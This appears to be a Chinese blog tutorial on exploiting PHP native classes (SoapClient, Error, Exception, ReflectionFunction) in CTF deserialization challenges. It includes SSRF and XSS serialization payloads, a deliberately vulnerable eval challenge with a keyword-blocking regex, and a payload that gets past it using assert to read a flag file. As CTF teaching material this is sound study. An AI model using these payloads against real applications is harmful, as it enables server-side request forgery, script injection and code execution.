# PHP中原生类的利用

## 前言

在ctf比赛当中，php的反序列是一个常考点，基本每次比赛都会遇到反序列的题目，最近还特别喜欢出原生类的题目，于是就想写篇文章来总结一下。

## 原生类的利用

在比赛当中，如果题目当中给出的类找不到可利用的点，那么就要考虑一下php的原生类了

先来看一下php当中有哪些原生类

```php
<?php
print_r(get_declared_classes());
?>
```

常见的可以利用的类有这么几个

+ SoapClient
+ Error
+ Exception

### `SoapClient`

其中SoapClient是利用的最多的

这个类是php里面用来访问web服务的类，其中提供了一个`__call`的方法，当这个`__call`方法被触发时他就会发送HTTP和HTTPS请求

![image-20210728103836458](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210728103836458.png)

这样会造成SSRF漏洞

例如

```php
<?php
$a = new SoapClient(null,array('uri'=>'http://example.com:28111', 'location'=>'http://example.com:28111/aaa'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();
```

![image-20210728110237703](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210728110237703.png)

调用了对象中不存在的方法后就会触发`__call`方法，利用这个来进行SSRF

### `Error`

根据文档所说error类是所有php内部错误类的基类，这个类在php7当中才引入

![image-20210728111654491](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210728111654491.png)

我们来看两个例子

![image-20210728112213213](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210728112213213.png)



![image-20210728112355427](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210728112355427.png)

可以看到这里触发了`__toString`方法后就将报错的行数还有错误信息给输出出来。

利用这个内置类可以来构造出xss

例：

```php
<?php
$a = unserialize($_GET['wing']);
echo $a;
?>
```

这里很明显就是存在了反序列化，但是题目中没有给出类，只能利用php当中的内置类了

```php
<?php
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>
```

![image-20210728113535617](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210728113535617.png)

这样就可以造成xss了

### `Exception`

这个类在php5和php7当中都有

也是一样会输出报错的

使用方法就跟error类差不多

## `实战演练`

### Nep-bbxhh_revenge

这一题考察的是php当中的原生反射机制

```php
 <?php 
highlight_file(__FILE__);
function waf($s) {
  return preg_replace('/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|>/i', "NepnEpneP", $s);
}
if(isset($_GET['a'])) {
  $_ = waf($_GET['a']);
  $__ = waf($_GET['b']);
  $a = new $_($__);
} else {
  $a = new Error('?');
}
if(isset($_GET['c']) && isset($_GET['d'])) {
  $c = waf($_GET['c']);
  $d = waf($_GET['d']);
  eval("\$a->$c($d);");
} else {
  $c = "getMessage";
  $d = "";
  eval("echo \$a->$c($d);");
}
?> 
```

![image-20210728125217377](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210728125217377.png)

这里利用了`ReflectionFunction`类中的`invokeArgs`方法

它会调用函数将它的参数作为数组传递

就相当于是`call_user_func`

![image-20210728125536129](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210728125536129.png)

没懂的话我们再来看看这个例子

```php
<?php

$a = $_GET['a'];
$b = $_GET['b'];
echo call_user_func($a,$b);
?>
```

![image-20210728130200442](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210728130200442.png)

由于这道题还存在waf，所以得跟`call_user_func`套娃使用

![image-20210728151616607](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210728151616607.png)

b是所调用的函数，我们使用`call_user_func`就行

下面是官方给的一个payload

```
index.php?a=ReflectionFunction&b=call_user_func&c=invokeArgs&d=array(%27assert%27,%27s%27.%27how_source(\%27/f\%27.\%27lag\%27)%27)
```

